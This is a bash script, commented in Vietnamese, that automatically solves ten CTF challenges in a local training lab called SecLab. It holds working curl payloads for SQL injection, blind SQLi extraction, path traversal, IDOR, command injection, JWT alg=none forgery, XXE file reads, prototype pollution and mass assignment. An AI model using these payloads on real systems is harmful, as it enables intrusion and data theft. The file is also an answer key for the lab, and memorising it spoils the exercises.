#!/usr/bin/env bash
# solve-all.sh — giải TRỌN 10 thử thách CTF của SecLab, chỉ cần bash + curl.
#
# Chạy:  bash solutions/ctf/scripts/solve-all.sh [base-url]
#        mặc định base-url = http://127.0.0.1:3000  (lab VULN đang chạy)
#
# Chỉ hoạt động trên bản vuln. Đọc comment từng hàm — mỗi hàm là một bài học.

set -u
BASE="${1:-http://127.0.0.1:3000}"
BASE="${BASE%/}"

# Guard an toàn: chỉ chạy trên loopback trừ khi bạn xác nhận sở hữu mục tiêu.
_host="${BASE#*://}"; _host="${_host%%[:/]*}"
case "$_host" in
  127.0.0.1|localhost|::1|'[::1]') ;;
  *) if [[ " $* " != *' --i-own-this-target '* ]]; then
       echo "⛔ Từ chối: mục tiêu \"$_host\" không phải loopback." >&2
       echo "   Thêm cờ --i-own-this-target nếu đây là server bạn sở hữu." >&2
       exit 2
     fi ;;
esac

# curl URL-encode cho query param: --data-urlencode chỉ có ở -d/--get → dùng
# python/node? Không cần: jq không có sẵn, ta encode tay bằng printf+xxd…
# Thực tế curl --get --data-urlencode đủ gọn:
get() { curl -s -o /dev/null -w '%{http_code}' "$BASE$1"; }
body() { curl -s "$BASE$1"; }
# encode một chuỗi thành %XX (bash thuần, không cần tool ngoài)
urlenc() {
  local s="$1" out="" c i
  for ((i=0; i<${#s}; i++)); do
    c="${s:i:1}"
    case "$c" in
      [a-zA-Z0-9._~-]) out+="$c" ;;
      *) printf -v hex '%%%02X' "'$c"; out+="$hex" ;;
    esac
  done
  printf '%s' "$out"
}
grep_flag() { grep -oE "FLAG\{$1-[0-9a-f]+\}" | head -1; }

# ── CTF #1 · SQLi — dump bảng users ──
solve01() { body "/search?q=$(urlenc "' OR 1=1 --")" | grep_flag 'sqli'; }

# ── CTF #2 · Traversal ──
solve02() { body "/download?name=../flag-ctf.txt" | grep_flag 'trav'; }

# ── CTF #3 · IDOR — apiKey dave ──
solve03() { body "/api/users/4" | grep_flag 'idor'; }

# ── CTF #4 · /admin ──
solve04() { body "/admin" | grep_flag 'admin'; }

# ── CTF #5 · Command Injection — thử cả & (cmd) lẫn ; (sh) ──
solve05() {
  for p in '127.0.0.1 & set SECLAB' '127.0.0.1; env'; do
    f=$(body "/tools/ping?host=$(urlenc "$p")" | grep_flag 'cmd')
    [ -n "$f" ] && { echo "$f"; return; }
  done
}

# ── CTF #6 · JWT alg=none — base64url(header).base64url(payload). ──
solve06() {
  b64u() { printf '%s' "$1" | base64 -w0 | tr '+/' '-_' | tr -d '='; }
  tok="$(b64u '{"alg":"none","typ":"JWT"}').$(b64u '{"sub":"ctfsvc","role":"svc"}')."
  body "/api/profile?token=$(urlenc "$tok")" | grep_flag 'jwt'
}

# ── CTF #7 · XXE ──
solve07() {
  curl -s -X POST "$BASE/api/import" -H 'content-type: application/xml' \
    --data '<!DOCTYPE r [<!ENTITY x SYSTEM "file:///flag-xxe.txt">]><i><item>&x;</item></i>' \
    | grep_flag 'xxe'
}

# ── CTF #8 · Prototype Pollution ──
solve08() {
  curl -s -X POST "$BASE/api/config" -H 'content-type: application/json' \
    --data '{"__proto__":{"isAdmin":true}}' > /dev/null
  body "/api/config" | grep_flag 'proto'
}

# ── CTF #9 · Mass Assignment → login → /api/me ──
solve09() {
  user="solver$$"
  curl -s -X POST "$BASE/api/register?role=admin" -d "username=$user&password=pw12345" > /dev/null
  sid=$(curl -si -X POST "$BASE/login" -d "username=$user&password=pw12345" \
        | grep -i '^set-cookie:' | grep -oE 'session=[a-f0-9]+' | cut -d= -f2)
  curl -s -H "Cookie: session=$sid" "$BASE/api/me" | grep_flag 'mass'
}

# ── CTF #10 · Blind SQLi — oracle boolean, rút từng ký tự ──
solve10() {
  local charset='FLAG{}blind-0123456789abcdefxyz' flag='' pos ch hit q code
  for ((pos=1; pos<=40; pos++)); do
    hit=''
    for ((ci=0; ci<${#charset}; ci++)); do
      ch="${charset:ci:1}"
      q="AB-100' AND (SELECT substr(flag,$pos,1) FROM ctf_blind)='$ch' --"
      code=$(get "/track?code=$(urlenc "$q")")
      [ "$code" = "200" ] && { hit="$ch"; break; }
    done
    [ -z "$hit" ] && break
    flag+="$hit"
    [ "$hit" = "}" ] && break
  done
  [ -n "$flag" ] && echo "$flag"
}

verify() {
  curl -s "$BASE/_lab/verify?id=$1&flag=$(urlenc "$2")" | grep -oE '"ok": *(true|false)' | grep -q true
}

NAMES=(SQLi Traversal IDOR Admin CmdInj JWT XXE ProtoPoll MassAssign BlindSQLi)
echo
echo "  SecLab CTF solver — target $BASE"
echo
solved=0
for i in "${!NAMES[@]}"; do
  n=$((i+1))
  printf '  [#%02d] %-10s ' "$n" "${NAMES[$i]}"
  flag=$(solve$(printf '%02d' "$n") 2>/dev/null || true)
  flag="${flag%%$'\n'*}"
  if [ -z "$flag" ]; then
    echo "✘ không lấy được cờ (hardened? vuln chưa chạy?)"
    continue
  fi
  if verify "$n" "$flag"; then
    solved=$((solved+1))
    echo "$flag  →  ✔ +điểm"
  else
    echo "$flag  →  ✘ server từ chối"
  fi
done
echo
echo "  KẾT QUẢ: $solved/10 thử thách"
echo
[ "$solved" = 10 ]
